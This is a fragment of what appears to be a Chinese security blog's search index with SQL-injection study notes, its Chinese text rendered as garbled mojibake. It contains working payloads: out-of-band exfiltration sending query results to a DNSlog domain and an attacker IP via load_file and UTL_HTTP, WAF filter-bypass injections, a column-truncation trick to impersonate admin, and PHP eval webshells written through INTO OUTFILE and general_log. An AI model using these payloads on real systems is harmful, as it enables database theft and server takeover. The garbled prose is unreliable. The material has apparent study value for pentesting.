æ³¨å…¥çš„å·®åˆ«æ˜¯ï¼Ÿ UNION æ‰§è¡Œçš„è¯­å¥ç±»å‹æ˜¯æœ‰é™çš„ï¼Œåªå¯ä»¥ç”¨æ¥æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ è€Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œä»»æ„è¯­å¥ æ³¨æ„ï¼šåœºæ™¯å°‘ï¼›ä½†æ˜¯å¨åŠ›å¤§ å¹¶ä¸æ˜¯æ¯ä¸€ä¸ªç¯å¢ƒä¸‹éƒ½å¯ä»¥æ‰§è¡Œï¼Œå¾ˆå¯èƒ½å— API æˆ–è€…æ•°æ®åº“å¼•æ“ä¸æ”¯æŒçš„é™åˆ¶ï¼ŒåŒæ—¶æƒé™ä¸è¶³ä¹Ÿæ˜¯é¢ä¸´çš„ä¸»è¦é—®é¢˜ åœ¨çœŸå®ç¯å¢ƒä¸­ï¼š é€šå¸¸åªè¿”å›ä¸€ä¸ªæŸ¥è¯¢ç»“æœï¼Œå› æ­¤ï¼Œå †å æ³¨å…¥ç¬¬äºŒä¸ªè¯­å¥äº§ç”Ÿé”™è¯¯æˆ–è€…ç»“æœåªèƒ½è¢«å¿½ç•¥ï¼Œæˆ‘ä»¬åœ¨å‰ç«¯ç•Œé¢æ˜¯æ— æ³•çœ‹åˆ°è¿”å›ç»“æœçš„ åœ¨ä½¿ç”¨å †å æ³¨å…¥ä¹‹å‰ï¼Œæˆ‘ä»¬ä¹Ÿæ˜¯éœ€è¦çŸ¥é“ä¸€äº›æ•°æ®åº“ç›¸å…³ä¿¡æ¯çš„ï¼Œä¾‹å¦‚è¡¨åï¼Œåˆ—åç­‰ä¿¡æ¯ åœ¨ PHP - MySQL ä¸­ç›¸å…³çš„ API $query = \"SELECT CURRENT_USER();\"; $query .= \"SELECT Name FROM City ORDER BY ID LIMIT 20, 5\"; /* æ‰¹é‡æ‰§è¡ŒæŸ¥è¯¢ */ if ($mysqli-\u003emulti_query($query)) { do { /* store first result set */ if ($result = $mysqli-\u003estore_result()) { while ($row = $result-\u003efetch_row()) { printf(\"%s\\n\", $row[0]); } $result-\u003efree(); } /* print divider */ if ($mysqli-\u003emore_results()) { printf(\"-----------------\\n\"); } } while ($mysqli-\u003enext_result()); } ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:7:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"8 OOB æ³¨å…¥ æ”»å‡»ç±»åˆ« SQL æ³¨å…¥ç±»å‹ è¯´æ˜ INBAND æŠ¥é”™æ³¨å…¥ã€UNION æ³¨å…¥ åœ¨åº”ç”¨å†…ç›´æ¥è·å–æ•°æ®ï¼Œé€šç”¨è¿‡åº”ç”¨è¿”å›æˆ–è€…æŠ¥é”™ç›´æ¥æå–æ•°æ® INFERENCE å¸ƒå°”æ³¨å…¥ã€æ—¶é—´ç›²æ³¨ é€šè¿‡åº”ç”¨çš„éç›´æ¥æ•°æ®åé¦ˆè¿›è¡Œæ¨æ–­ OUT OF BAND OOB SQL æ³¨å…¥ é€šè¿‡å…¶å®ƒä¿¡é“è·å–æ•°æ® ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:8:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"8.1 å¸¦å¤–é€šé“æŠ€æœ¯å®šä¹‰ - Out Of Band å¸¦å¤–é€šé“æŠ€æœ¯(OOB)è®©æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡å¦ä¸€ç§æ–¹å¼æ¥ç¡®è®¤å’Œåˆ©ç”¨æ²¡æœ‰ç›´æ¥å›æ˜¾çš„æ¼æ´ã€‚ è¿™ä¸€ç±»æ¼æ´ä¸­ï¼Œæ”»å‡»è€…æ— æ³•é€šè¿‡æ¶æ„è¯·æ±‚ç›´æ¥åœ¨å“åº”åŒ…ä¸­çœ‹åˆ°æ¼æ´çš„è¾“å‡ºç»“æœã€‚ å¸¦å¤–é€šé“æŠ€æœ¯é€šå¸¸éœ€è¦è„†å¼±çš„å®ä½“æ¥ç”Ÿæˆå¸¦å¤–çš„ TCP/UDP/ICMP è¯·æ±‚ï¼Œç„¶åï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è¿™ä¸ªè¯·æ±‚æ¥æå–æ•°æ®ã€‚ ä¸€æ¬¡æˆåŠŸçš„ OOB æ”»å‡»æ˜¯åŸºäºï¼š å­˜åœ¨æ¼æ´çš„ç³»ç»Ÿ å¤–å›´é˜²ç«å¢™çš„å‡ºç«™è¯·æ±‚ ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:8:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"8.2 OOB vs. X 8.2.1 OOB vs. Inband å¸¸è§„é€šä¿¡ä¿¡é“ éåº”ç”¨å†…ä¿¡é“ 8.2.2 OOB vs. Time-based Blind Injection å¯ä»¥çœ‹ä½œæ˜¯å¦ä¸€ç§ç›²æ³¨æŠ€æœ¯ ä¸ç›²æ³¨ç›¸æ¯”ï¼Œé€Ÿåº¦å…·æœ‰ä¼˜åŠ¿ï¼Œå› ä¸ºå…¶å®é™…ä¸Šå®ç°äº†å˜ç›¸çš„å›æ˜¾ ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:8:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"8.3 OOB åˆ©ç”¨å‡½æ•° - load_file å‡½æ•° load_file å‡½æ•°æ˜¯ MySQL ä¸­ä¸€ä¸ªå¸¸ç”¨çš„å‡½æ•°ï¼Œä¸»è¦ç”¨æ¥è¯»å–æ–‡ä»¶å†…å®¹ã€‚ å‡½æ•°åŸå‹ï¼šload_file(file_path) è¯¥å‡½æ•°ä¼šè¯»å–æ–‡ä»¶å†…å®¹ï¼Œå¹¶å°†æ–‡ä»¶å†…å®¹ä½œä¸ºå­—ç¬¦ä¸²è¿”å›ã€‚å¦‚æœè¯»å–å¤±è´¥ä¼šè¿”å› null ä¿¡æ¯ è¯¥å‡½æ•°åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­éœ€è¦éµå¾ª secure_file_priv çš„é™åˆ¶ï¼Œå¦‚æœç›´æ¥æ‰§è¡Œï¼Œåœ¨è¯»å–ç›®æ ‡æ–‡ä»¶å†…å®¹æ—¶ä¼šå¤±è´¥ã€‚ secure_file_priv å˜é‡çš„å€¼ä¸º /var/lib/mysql-filesï¼Œå› æ­¤ load_file() å‡½æ•°åªèƒ½å¤Ÿå»è¯»è¯¥ç›®å½•ä¸‹çš„æ–‡ä»¶å†…å®¹ æ³¨æ„ å¦‚æœæƒ³å®Œæˆä»»æ„ç›®å½•ä¸‹æ–‡ä»¶è¯»å–éœ€è¦åœ¨ /etc/my.conf(my.ini) ä¸­å°† secure_file_priv çš„å€¼ç½®ä¸ºç©º ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:8:3","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"8.4 OOB æ³¨å…¥åŸç† åœ¨ windows ä¸‹ï¼Œåˆ©ç”¨ load_file å‡½æ•°å¯ä»¥è¯»å– UNC è·¯å¾„çš„ç‰¹æ€§ï¼ŒæŠŠæ³¨å…¥äº§ç”Ÿçš„ä¿¡æ¯æ¥æ”¾åˆ° UNC åœ°å€ä¸­ï¼Œé€šè¿‡ DNSLogï¼Œå°†æ•°æ®å¸¦å‡º ç¤ºä¾‹ select load_file(concat(\"\\\\\\\\\", (select database()), â€œ.xxx.ceye.io\\\\abcâ€)) ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:8:4","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"8.5 æ‰©å±• - å¤§æ–‡æœ¬ä¼ è¾“ åŸŸåé•¿åº¦é™åˆ¶ åŸŸåç”±æ ‡ç­¾ç»„æˆï¼Œä»¥ . åˆ†å‰²ï¼Œæ ‡ç­¾çš„é•¿åº¦ä¸å¯ä»¥è¶…è¿‡ 63 ä¸ªå­—ç¬¦ æ•´ä¸ªåŸŸåä¸å¯ä»¥è¶…è¿‡ 253 ä¸ªå­—ç¬¦ï¼ŒåŒ…æ‹¬ . æ€è·¯ ä½¿ç”¨ load_file è¯»å–æ–‡ä»¶å†…å®¹ ä½¿ç”¨ substr å¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œåˆ‡ç‰‡ ä½¿ç”¨ to_base64 å¯¹åˆ‡ç‰‡çš„å†…å®¹è¿›è¡Œç¼–ç  ä½¿ç”¨ concat å°†ç¼–ç åçš„å†…å®¹ä¸åŸŸåè¿›è¡Œæ‹¼æ¥ ä½¿ç”¨ load_file è®¿é—®è¯¥ UNC select concat(to_base64(substr(load_file(\"xxx\"),1,15)), \"dnslog.com\") as result æŠ€å·§ oracle æ•°æ®åº“ä¸­ï¼Œå­˜åœ¨å‘èµ· HTTP è¯·æ±‚çš„å‡½æ•° UTL_HTTP.request UTL_HTTP.request(url, proxy) å®ƒçš„è¿”å›ç±»å‹æ˜¯é•¿åº¦ä¸º 2000 æˆ–æ›´çŸ­çš„å­—ç¬¦ä¸²ï¼Œå®ƒåŒ…å«ä» HTTP è¯·æ±‚è¿”å›åˆ°å‚æ•° URL çš„ HTML ç»“æœçš„å‰ 2000 ä¸ªå­—èŠ‚ é€šè¿‡ SQL æ³¨å…¥è®©ç›®æ ‡æœåŠ¡å™¨æ‰§è¡Œï¼š select UTL_HTTP.request('http://IP/test.php'||'?id='||(select version from v$instance)) from dual; åœ¨æ”»å‡»äººå‘˜çš„ test.php ä¸Šè®°å½• id å‚æ•°ä¼ é€’è¿‡æ¥çš„æ•°æ®ï¼Œå¹¶å†™å…¥æ–‡ä»¶ä¸­ ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:8:5","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"9 WAF ç»•è¿‡ ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:9:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"9.1 and å’Œ or ç»•è¿‡ è¿‡æ»¤ä»£ç ï¼špreg_match('/(and|or)/i', $id) ç»•è¿‡ï¼šåˆ©ç”¨ || ä»£æ›¿ orï¼Œ\u0026\u0026 ä»£æ›¿ and ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:9:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"9.2 union è¿‡æ»¤ç»•è¿‡ è¿‡æ»¤ä»£ç ï¼špreg_match('/(and|or|union)/i', $id) ç»•è¿‡ï¼š || (select user from users where user_id=1)='admin' é—®é¢˜ æ€ä¹ˆçŸ¥é“ user è¡¨ã€user åˆ—ã€admin å­—æ®µï¼Ÿ è¡¨åç¡®å®å¯ä»¥çŒœè§£ï¼Œå°¤å…¶æ˜¯ user è¿™ç§å¸¸ç”¨è¡¨ å¦‚æœçŒœä¸åˆ°ï¼Œé€šè¿‡ information_schema.tables åŠ substr æ¥è”åˆåˆ¤æ–­ åˆ—åå’Œå­—æ®µå†…å®¹ä¹Ÿæ˜¯åŒç† ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:9:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"9.3 where è¿‡æ»¤ç»•è¿‡ è¿‡æ»¤ä»£ç ï¼špreg_match('/(and|or|union|where)/i', $id) ç»•è¿‡ï¼š|| (select user from users limit 1,1)='admin' ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:9:3","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"9.4 limit è¿‡æ»¤ç»•è¿‡ è¿‡æ»¤ä»£ç ï¼špreg_match('/(and|or|union|where|limit)/i', $id) ç»•è¿‡ï¼š|| (select min(user) from group by user_id having user_id=1 ='admin' ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:9:4","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"9.5 group by è¿‡æ»¤ç»•è¿‡ è¿‡æ»¤ä»£ç ï¼špreg_match('/(and|or|union|where|limit|group by)/i', $id) ç»•è¿‡ï¼š ||(select substr((select group_concat(name)name from test), 1, 1))='t' ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:9:5","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"9.6 select åŠå•å¼•å·è¿‡æ»¤ç»•è¿‡ è¿‡æ»¤ä»£ç ï¼špreg_match('/(and|or|union|where|limit|group by|select|\\')/i', $id) ç»•è¿‡ï¼š å¸ƒå°”ç›²æ³¨ä¸éœ€è¦ select || substr(name,1,1)=0x74 || substr(name,1,1)=unhex(74) ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:9:6","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"9.7 hexã€unhex åŠ substr è¿‡æ»¤ç»•è¿‡ - binary è¿‡æ»¤ä»£ç ï¼špreg_match('/(and|or|union|where|limit|group by|select|\\'|hex|unhex|substr)/i', $id) ç»•è¿‡ï¼š || binary(name) = 0x74657374 ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:9:7","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"9.8 ç©ºæ ¼è¿‡æ»¤ç»•è¿‡ è¿‡æ»¤ä»£ç ï¼špreg_match('/(and|or|union|where|limit|group by|select|\\'|hex|unhex|substr|\\s)/i', $id) ç»•è¿‡ï¼šæ³¨é‡Šç¬¦ä»£æ›¿ç©ºæ ¼ ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:9:8","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"9.9 ç­‰å·è¿‡æ»¤ç»•è¿‡ è¿‡æ»¤ä»£ç ï¼špreg_match('/(and|or|union|where|limit|group by|select|\\'|hex|unhex|substr|\\s| =)/i', $id) ç»•è¿‡ï¼šåˆ©ç”¨ likeã€rlikeã€regexpã€!(username\u003c\u003e\"admin\")(table_name\u003c\u003e'ffll44jj') ä»£æ›¿ç­‰å· ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:9:9","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"9.10 å…¶å®ƒç±»å‹çš„ç»•è¿‡ åŒå†™ç»•è¿‡ åŒé‡ç¼–ç ç»•è¿‡ ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:9:10","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"10 äºŒæ¬¡æ³¨å…¥ é—®é¢˜ ç”¨æˆ·ä¼ é€’ç»™ WEB åº”ç”¨çš„æ•°æ®ä¸å¯ä¿¡ï¼Œæ•°æ®åº“ä¸­çš„æ•°æ®æ˜¯å¦å¯ä¿¡ï¼Ÿ ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:10:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"10.1 åŸç† ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:10:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"11 åŸºäºçº¦æŸçš„ SQL æ”»å‡» ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:11:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"11.1 åŸç† åœ¨ INSERT ä¸­ï¼ŒSQL ä¼šæ ¹æ® varchar(n) æ¥é™åˆ¶å­—ç¬¦ä¸²çš„æœ€å¤§é•¿åº¦ã€‚å¦‚æœå­—ç¬¦ä¸²çš„é•¿åº¦å¤§äº n ä¸ªå­—ç¬¦çš„è¯ï¼Œé‚£ä¹ˆä»…ä½¿ç”¨å­—ç¬¦ä¸²çš„å‰ n ä¸ªå­—ç¬¦ã€‚ åœ¨ SQL ä¸­æ‰§è¡Œå­—ç¬¦ä¸²å¤„ç†æ—¶ï¼Œå­—ç¬¦ä¸²æœ«å°¾çš„ç©ºæ ¼ç¬¦å°†ä¼šè¢«åˆ é™¤(ç»“åˆä¸Šé¢çš„è¿™é‡Œåº”è¯¥å°±å¯ä»¥æ„é€ å‡ºpayloadäº†)ã€‚ä½†ä¹Ÿæœ‰ç‰¹æ®Šæƒ…å†µï¼Œæ¯”å¦‚ LIKEã€‚ é—®é¢˜ å‡è®¾ç°åœ¨æ•°æ®åº“çš„ä¸€ä¸ªè¡¨é‡Œå·²ç»æœ‰äº† admin ç”¨æˆ·ï¼Œä¸”ç”¨æˆ·å varchar(30) å†æ’å…¥ä¸€ä¸ª admin(25ä¸ªç©ºæ ¼) 1 å› ä¸ºé™åˆ¶é•¿åº¦ 30 ä½ï¼Œæ‰€ä»¥ä¼šåªå­˜å…¥å‰ 30 ä½ è¿™æ ·å°±å¯ä»¥åˆ›å»º admin ç”¨æˆ· insert into user values ('admin é•¿åº¦è¶…è¿‡è¡¨å­—æ®µçš„é™åˆ¶è¢«æˆªæ–­ 1', 'pass'); ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:11:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"11.2 å®ä¾‹ å°è¯•æ³¨å†Œæ–°ç”¨æˆ·ï¼Œå‘ç°åªæœ‰ admin æ‰èƒ½è·å– flagï¼š é€šè¿‡æ³¨å†Œé¡µé¢å‘ç° admin ç”¨æˆ·å·²å­˜åœ¨ï¼š åœ¨ burpsuite ä¸­ä¿®æ”¹æ³¨å†Œæ•°æ®åŒ…ï¼Œå°† username å­—æ®µæ”¹ä¸ºå¦‚å›¾æ‰€ç¤ºçš„ç©ºæ ¼ + å­—ç¬¦çš„å½¢å¼ï¼š ä»¥ admin èº«ä»½ç™»å½•ï¼Œè·å– flagï¼š ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:11:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"12 SQL æ³¨å…¥å‘½ä»¤æ‰§è¡Œ ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:12:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"12.1 SQL æ³¨å…¥å†™æ–‡ä»¶ é€šè¿‡ SQL æ³¨å…¥ï¼Œç›´æ¥å†™å…¥ webshell æ–‡ä»¶åˆ°æœåŠ¡å™¨ï¼Œé€šè¿‡ GET æ–¹æ³•æˆ–è€… POST æ–¹æ³•æäº¤å¹¶æ‰§è¡Œå¤–éƒ¨æŒ‡ä»¤ï¼Œä¸ºåç»­è¿›ä¸€æ­¥è¿œç¨‹æ§åˆ¶ï¼Œææƒï¼Œåˆ›é€ æ¡ä»¶ã€‚ æ³¨æ„ éœ€è¦ mysql ç”¨æˆ·åœ¨å†™å…¥æ–‡ä»¶å¤¹ä¸‹æœ‰å†™å…¥æƒé™ï¼Œå³ secure_file_priv ä¸ºä¸ä¸ºç©ºã€‚ æŠ€å·§ å½“secure_file_priv ä¸ä¸ºç©ºæ—¶ï¼Œå¯ä»¥ä½¿ç”¨ general_log å†™æ–‡ä»¶ï¼š set global general_log=on; set global general_log_file='C:/phpStudy/WWW/789.php'; select '\u003c?php eval($_POST['a']) ?\u003e'; 12.1.1 union select åå†™å…¥ select username, password from users where id=\"1\" union select null,'\u003c?php @eval($_REQUEST[1]);?\u003e' into outfile '/var/www/html/cmd.php' æ³¨æ„ï¼šåœ¨ windows ä¸‹çš„åˆ†éš”ç¬¦ä¸º /ï¼ˆæ–œæ ï¼‰ã€‚ 12.1.2 è¡Œåˆ†éš”ç¬¦å†™å…¥ é€šè¿‡ select è¯­å¥æŸ¥è¯¢çš„å†…å®¹å†™å…¥æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯ into outfile â€˜C:/wamp64/www/work/webshell.phpâ€™ è¿™æ ·å†™çš„åŸå› ï¼Œç„¶ååˆ©ç”¨ lines terminated by è¯­å¥æ‹¼æ¥ webshell çš„å†…å®¹ã€‚ lines terminated by å¯ä»¥ç†è§£ä¸ºã€Œä»¥æ¯è¡Œç»ˆæ­¢çš„ä½ç½®æ·»åŠ  xx å†…å®¹ã€ã€‚ åˆ©ç”¨ lines starting by 